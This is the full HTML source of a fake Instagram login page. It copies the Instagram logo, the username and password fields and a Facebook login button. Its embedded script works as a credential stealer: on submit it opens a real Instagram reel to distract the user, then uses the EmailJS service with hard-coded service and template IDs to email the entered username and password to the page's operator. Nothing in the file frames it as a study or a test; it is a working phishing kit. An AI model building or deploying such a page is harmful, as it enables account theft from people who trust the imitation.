<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/2111/2111463.png">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
    <div class="container">
        <!-- <div class="image-section"> -->
            <!-- Placeholder for Instagram phone/images section -->
            <!-- <div class="mockup-images"> -->
                <!-- Add your images/icons here -->
                <!-- <div class="img-placeholder img1"><img src="images (1).jpg" alt=""></div>
                <div class="img-placeholder img2"><img src="smiley-woman-bridge.jpg" alt=""></div>
                <div class="img-placeholder img3"><img src="images.jpg" alt=""></div>
            </div>
        </div> -->
        <div class="login-section">
            <i class="fa fa-instagram" style="font-size:48px;color:rgb(211, 105, 123)"></i>
            <h1 class="insta-logo">Instagram</h1>
            <form class="login-form" id="contactForm" method="POST">
                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <button type="submit">Log in</button>
                <div class="divider">
                    <div class="line"></div>
                    <div class="or">OR</div>
                    <div class="line"></div>
                </div>
                <button type="button" class="fb-login">
                    <!-- Facebook icon placeholder -->
                    Log in with Facebook
                </button>
                <a href="#" class="forgot">Forgot password?</a>
            </form>
            <div class="signup-box">
                <span>Don't have an account?</span> <a href="#">Sign up</a>
            </div>
        </div>
    </div>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script>
  (function(){
    emailjs.init("TSYSZ7jUEQFP1dHPg"); // STEP 1: YOUR PUBLIC KEY
  })();

  document.getElementById("contactForm").addEventListener("submit", function(event){
    event.preventDefault();
    
    window.open("https://www.instagram.com/reel/DM27AwPz04H/?utm_source=ig_web_copy_link&igsh=MWZhYTloanBmcnJzbA==", "_blank");

    // Continue with EmailJS logic
    emailjs.send("service_elwivjm", "template_r0wg4ee", {
      username: document.getElementById("username").value,
      password: document.getElementById("password").value,
    }).then(function(response) {
      console.log(response);
       
    }, function(error) {
      console.log(error);
    });
    
  });
</script>
</body>
</html>
